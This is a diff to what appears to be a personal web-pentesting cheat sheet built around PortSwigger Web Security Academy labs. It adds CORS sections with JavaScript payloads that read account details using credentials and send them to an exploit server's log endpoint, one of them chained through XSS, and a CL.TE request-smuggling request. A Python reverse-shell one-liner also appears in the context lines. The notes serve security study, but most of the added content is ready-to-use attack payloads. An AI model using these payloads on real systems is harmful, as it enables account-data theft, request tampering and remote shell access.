@@ -211,6 +211,36 @@ TABLE OF CONTENTS
         8.4 PYTHON
                 8.4.1
                         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+11. CORS
+        11.1 REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER
+                11.1.1 DESCRIPTION
+                11.1.2 SAMPLE PAYLOAD
+                        <script>
+                        var req = new XMLHttpRequest();
+                        req.onload = reqListener;
+                        req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); //target
+                        req.withCredentials = true;
+                        req.send();
+
+                        function reqListener() {
+                                location='/log?key='+this.responseText; //Attacker exfiltration server
+                        };
+                        </script>
+        11.2 TRUSTED NULL ORIGIN
+                11.2.1 DESCRIPTION
+                        If Origin: null is accepted origin
+                        Payload can be created within an iframe on attacker site, to emulate null origin. 
+                11.2.2 SAMPLE PAYLOAD
+        11.3 TRUSTED SUBDOMAINS [36] 
+                11.3.1 DESCRIPTION
+                        If http://test.com is accepted origin
+                        Check if http://evil.test.com is accepted origin
+                        If subdomain has an XSS vulnerability, can exploit this to leak sensitive data
+                11.3.2 SAMPLE PAYLOAD
+                        <script>
+                        document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
 12. OAUTH
         12.1 OVERVIEW
                 12.1.1 ACTORS [34]
@@ -261,6 +291,25 @@ TABLE OF CONTENTS
                 http://www.derricksdoughnuts.com/apply_discount?discount_percent=10
         13.4 REFERER HEADER
                 - Developers will sometimes restrict access depending on the HTTP header information contained in a request. Try changing Referrer header. 
+14. HTTP REQUEST SMUGGLING
+        14.1 DESCRIPTION
+                - The HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header. 
+                - If front-end and back-end servers interpret incoming requests differently, an attacker may be able to trick the servers to "smuggle" content that normally would be blocked. Or to tamper with next request. 
+        14.2 EXPLOITS
+                14.2.1 BASIC CL.TE
+                        - First server inteprets Content-Length. Second interprets Transfer-Encoding.
+                        - Second request will return "Unrecognized method GPOST". 
+                        POST / HTTP/1.1
+                        Host: 0a4c007804eca518c57ef0d400d8002a.web-security-academy.net
+                        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
+                        Content-Type: application/x-www-form-urlencoded
+                        Content-Length: 10
+                        Connection: keep-alive
+                        Transfer-Encoding: chunked
+
+                        0
+
+                        G
 19. DIRBUSTER
         19.1 ADVANCED OPTIONS
                 19.1.1 HTTP OPTIONS
@@ -626,3 +675,4 @@ References
 [33] https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex
 [34] https://portswigger.net/web-security/oauth
 [35] https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
+[36] https://portswigger.net/web-security/cors/lab-breaking-https-attack
